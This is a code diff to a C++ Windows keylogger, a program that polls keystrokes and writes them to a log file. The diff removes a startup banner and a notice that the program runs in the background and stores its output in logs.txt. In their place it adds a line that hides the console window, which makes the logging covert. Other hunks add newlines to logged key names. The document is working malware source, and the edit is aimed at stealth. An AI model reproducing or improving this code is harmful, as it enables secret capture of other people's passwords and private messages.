@@ -61,24 +61,8 @@ void LogPressedData(int i) {
 
     fclose(LOG_FILE);
 }
-
-void intro() {
-    std::string a = "\n"
-        "_________                            ____  __.            .____                                      \n"
-        "\\_   ___ \\     .__         .__      |    |/ _|____ ___.__.|    |    ____   ____   ____   ___________ \n"
-        "/    \\  \\/   __|  |___   __|  |___  |      <_/ __ <   |  ||    |   /  _ \\ / ___\\ / ___\\_/ __ \\_  __ \\\n"
-        "\\     \\____ /__    __/  /__    __/  |    |  \\  ___/\\___  ||    |__(  <_> ) /_/  > /_/  >  ___/|  | \\/\n"
-        " \\______  /    |__|        |__|     |____|__ \\___  > ____||_______ \\____/\\___  /\\___  / \\___  >__|   \n"
-        "        \\/                                  \\/   \\/\\/             \\/    /_____//_____/      \\/       ";
-
-    std::cout << a << std::endl;
-}
-
 int main() { 
-    intro();
-    print("\n\n\nThe Program will run in the background, it's output will be stored in logs.txt");
-   Sleep(1000);
-   FreeConsole();
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // hides the console window. Remove this line if you need to view it 
     while (true) {
         Sleep(20);
         for (char i = _MIN_ASCII_CHAR_; i < _MAX_ASCII_CHAR_; i++) {
@@ -170,18 +154,18 @@ std::string convertToKey(int i) {
 
 
     case VK_MULTIPLY:
-        logMessage = "Multiply key";
+        logMessage = "Multiply key\n";
         break;
     case VK_ADD:
-        logMessage = "Add key";
+        logMessage = "Add key\n";
         break;
     case VK_SEPARATOR:
 
-        logMessage = "Separator key";
+        logMessage = "Separator key\n";
         break;
     case VK_SUBTRACT:
 
-        logMessage = " Subtract key";
+        logMessage = " Subtract key\n";
         break;
     case VK_DECIMAL:
 
